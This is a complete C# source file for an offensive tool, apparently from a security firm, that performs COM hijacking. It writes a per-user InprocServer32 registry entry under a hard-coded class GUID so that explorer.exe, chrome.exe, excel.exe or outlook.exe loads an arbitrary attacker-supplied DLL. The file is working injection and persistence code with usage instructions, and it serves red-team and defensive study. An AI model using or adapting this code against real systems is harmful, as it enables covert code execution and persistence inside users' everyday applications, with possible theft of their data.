// Copyright (c) 2019, NCC Group. All rights reserved.
// Licensed under BSD 3-Clause License per LICENSE file

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.ComponentModel;
using System.IO;

namespace COMInjectDotNet
{
    class Program
    {
        static void Main(string[] args)
        {
            //add/replace these keys to allow injection into new processes
            //you probably want to test this out with one of the provided templates to find something that triggers often
            IDictionary<string, string> hijackDict = new Dictionary<string, string>();
            hijackDict.Add("explorer.exe", "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}");
            hijackDict.Add("chrome.exe", "{1F486A52-3CB1-48FD-8F50-B8DC300D9F9D}");
            hijackDict.Add("excel.exe", "{33C53A50-F456-4884-B049-85FD643ECFED}");
            hijackDict.Add("outlook.exe", "{529A9E6B-6587-4F23-AB9E-9C7D683E3C50}");

            string processName = "explorer.exe";
            if (!(args.Length == 1 || args.Length == 2))
            {
                Console.WriteLine("Usage: COMInject.exe [pid or processname.exe] C:\\path\\to\\library.dll");
                Console.WriteLine("COMInject.exe show - print which process are supported for injection");
                return;
            }
            if (args[0].Equals("show"))
            {
                foreach (KeyValuePair<string, string> process in hijackDict)
                {
                    Console.WriteLine(process.Key);
                }
                return;
            }
            if (int.TryParse(args[0], out int pid)) {
                Process[] processlist = Process.GetProcesses();
                var proc = processlist.FirstOrDefault(pr => pr.Id == pid);
                if (proc != null)
                {
                    processName = proc.ProcessName;
                }
                else
                {
                    Console.WriteLine("PID not found");
                    return;
                }
            }
            else 
            {
                string procArg = args[0];
                procArg = procArg.Replace(".exe", "");
                List<string> supportedProcs = new List<string>();
                foreach (KeyValuePair<string, string> process in hijackDict)
                {
                    supportedProcs.Add(process.Key.Replace(".exe", ""));
                }
                if (!supportedProcs.Contains(procArg))
                {
                    Console.WriteLine("This process is not supported");
                    return;
                }
                else
                {
                    processName = args[0];
                }
            }
            if (!processName.Contains(".exe"))
            {
                processName = processName + ".exe";
            }

            if (args.Length < 2)
            {
                Console.WriteLine("Missing args");
                return;
            }
            string DllPath = args[1];
            if (!File.Exists(DllPath)) {
                Console.WriteLine("DLL does not exist on file system");
                return;
            }
            string guid = hijackDict[processName];
            Console.WriteLine("Hijacking object from {0} with {1} using GUID {2}", processName, DllPath, guid);

            //write the registry key to HKCU to hijack the object
            //library is responsible for cleaning itself up
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\" + guid + "\\InprocServer32");
            key.SetValue("", DllPath);
            key.Close();

        }
    }
}
